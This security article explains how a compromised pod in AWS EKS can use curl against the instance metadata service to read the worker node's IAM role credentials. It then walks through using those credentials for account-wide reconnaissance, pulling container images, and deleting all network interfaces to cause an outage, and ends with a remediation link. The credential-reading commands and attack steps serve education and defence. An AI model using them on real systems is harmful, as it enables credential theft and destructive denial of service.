---
author: Aloïs THÉVENOT
title: "Privilege Escalation in AWS Elastic Kubernetes Service (EKS)"
description: Compromising a pod in the cluster can have disastrous consequences on resources in the AWS account if access to the Instance Metadata service is not explicitly blocked.
contributors: christophetd
---

As a reminder, the [Instance Metadata service](/aws/general-knowledge/intro_metadata_service/) is an AWS API listening on a link-local IP address, 169.254.169.254. It is only accessible from EC2 instances and allows to retrieve various information about them.

It is particularly useful when you need your instances to access AWS resources. Instead of hard-coding credentials, you first assign an IAM role to your instance. From the instance, you can then retrieve temporary credentials for the role. This is 100 % transparent if you use the AWS CLI.

## Accessing the Instance Metadata service from a compromised pod

Querying the Instance Metadata service from a compromised pod:

```json
(pod)$ curl http://169.254.169.254/latest/meta-data/iam/info
{
  "Code" : "Success",
  "LastUpdated" : "2020-08-31T17:03:39Z",
  "InstanceProfileArn" : "arn:aws:iam::account-id:instance-profile/eksctl-christophe-cluster-nodegroup-ng-15050c0b-NodeInstanceProfile-1AS40JWHFGXJ2",
  "InstanceProfileId" : "AIPA..."
}
```

We see that we can access the Instance Metadata service and that we’re able to retrieve temporary credentials for the IAM role christophe-cluster-nodegroup-ng-15050c0b-NodeInstanceProfile-1AS40JWHFGXJ2. 

```json
(pod)$ curl http://169.254.169.254/latest/meta-data/iam/security-credentials/eksctl-christophe-cluster-nodegro-NodeInstanceRole-1XY9GXQ417J7H
{
  "Code" : "Success",
  "LastUpdated" : "2020-08-31T17:03:25Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIA..PP",
  "SecretAccessKey" : "Xm/..Z2",
  "Token" : "IQoJ..Vg==",
  "Expiration" : "2020-08-31T23:38:39Z"
}
```

This is the IAM role assigned to the EC2 instances acting as Kubernetes worker nodes.


## Amazon EKS node IAM role

This role is [documented](https://docs.aws.amazon.com/eks/latest/userguide/create-node-role.html) by AWS, and we can see it’s attached to the following AWS managed policies:

- [AmazonEKSWorkerNodePolicy](https://aws.permissions.cloud/managedpolicies/AmazonEKSWorkerNodePolicy)
- [AmazonEC2ContainerRegistryReadOnly](https://aws.permissions.cloud/managedpolicies/AmazonEC2ContainerRegistryReadOnly)
- Either the [AmazonEKS_CNI_Policy](https://aws.permissions.cloud/managedpolicies/AmazonEKS_CNI_Policy) managed policy or an IPv6 policy

### AmazonEKSWorkerNodePolicy

```json

{
    "Statement": [
        {
            "Action": [
                "ec2:DescribeInstances",
                "ec2:DescribeInstanceTypes",
                "ec2:DescribeRouteTables",
                "ec2:DescribeSecurityGroups",
                "ec2:DescribeSubnets",
                "ec2:DescribeVolumes",
                "ec2:DescribeVolumesModifications",
                "ec2:DescribeVpcs",
                "eks:DescribeCluster"
            ],
            "Effect": "Allow",
            "Resource": "*"
        }
    ],
    "Version": "2012-10-17"
}
```

### AmazonEC2ContainerRegistryReadOnly

```json
{
    "Statement": [
        {
            "Action": [
                "ecr:GetAuthorizationToken",
                "ecr:BatchCheckLayerAvailability",
                "ecr:GetDownloadUrlForLayer",
                "ecr:GetRepositoryPolicy",
                "ecr:DescribeRepositories",
                "ecr:ListImages",
                "ecr:DescribeImages",
                "ecr:BatchGetImage",
                "ecr:GetLifecyclePolicy",
                "ecr:GetLifecyclePolicyPreview",
                "ecr:ListTagsForResource",
                "ecr:DescribeImageScanFindings"
            ],
            "Effect": "Allow",
            "Resource": "*"
        }
    ],
    "Version": "2012-10-17"
}
```

### AmazonEKS_CNI_Policy

```json
{
    "Statement": [
        {
            "Action": [
                "ec2:AssignPrivateIpAddresses",
                "ec2:AttachNetworkInterface",
                "ec2:CreateNetworkInterface",
                "ec2:DeleteNetworkInterface",
                "ec2:DescribeInstances",
                "ec2:DescribeTags",
                "ec2:DescribeNetworkInterfaces",
                "ec2:DescribeInstanceTypes",
                "ec2:DetachNetworkInterface",
                "ec2:ModifyNetworkInterfaceAttribute",
                "ec2:UnassignPrivateIpAddresses"
            ],
            "Effect": "Allow",
            "Resource": "*"
        },
        {
            "Action": [
                "ec2:CreateTags"
            ],
            "Effect": "Allow",
            "Resource": [
                "arn:aws:ec2:*:*:network-interface/*"
            ]
        }
    ],
    "Version": "2012-10-17"
}
```

## Exploitation

Here are some examples of bad things we can do.

- Map the network, by **listing and describing VPCs, subnets**, and security groups*. Not only the VPC associated to the EKS cluster, but across the whole AWS account.
- **Describe any EC2 instance** in the AWS account. This includes information such as the AMI used, private IP, disks attached…
- **Nuke all network interfaces** of every EC2 instance with successive calls to `ec2:DescribeNetworkInterfaces`, `ec2:DetachNetworkInterface`, and `ec2:DeleteNetworkInterface`. This will bring offline all your instances and dependent AWS managed services. Your fancy EKS cluster? Gone. Your highly-available, auto-scalable web application spanning in 3 AZs? Offline. Great attack vector for a denial of service.
- **Enumerate and pull any Docker image** (“ECR repository“) in the account. As a bonus, you can even query the image vulnerability scan results by calling ecr:DescribeImageScanFindings. This will give you a nice list of the vulnerabilities [identified](https://docs.aws.amazon.com/AmazonECR/latest/userguide/image-scanning.html) by AWS in these images. This can be very helpful for further exploitation of pods inside the EKS cluster. Who needs Nessus anyway?

Again, all this is **AWS account-wide**, comes by default when spinning up an EKS cluster, and is accessible by only having compromised a single, underprivileged pod in the cluster.

## Remediation

AWS has documented ways to [restrict access to the instance profile assigned to the worker node](https://aws.github.io/aws-eks-best-practices/security/docs/iam/#restrict-access-to-the-instance-profile-assigned-to-the-worker-node).

## Reference

- [Privilege Escalation in AWS Elastic Kubernetes Service (EKS) by compromising the instance role of worker nodes](https://blog.christophetd.fr/privilege-escalation-in-aws-elastic-kubernetes-service-eks-by-compromising-the-instance-role-of-worker-nodes/) by [christophetd](https://github.com/christophetd)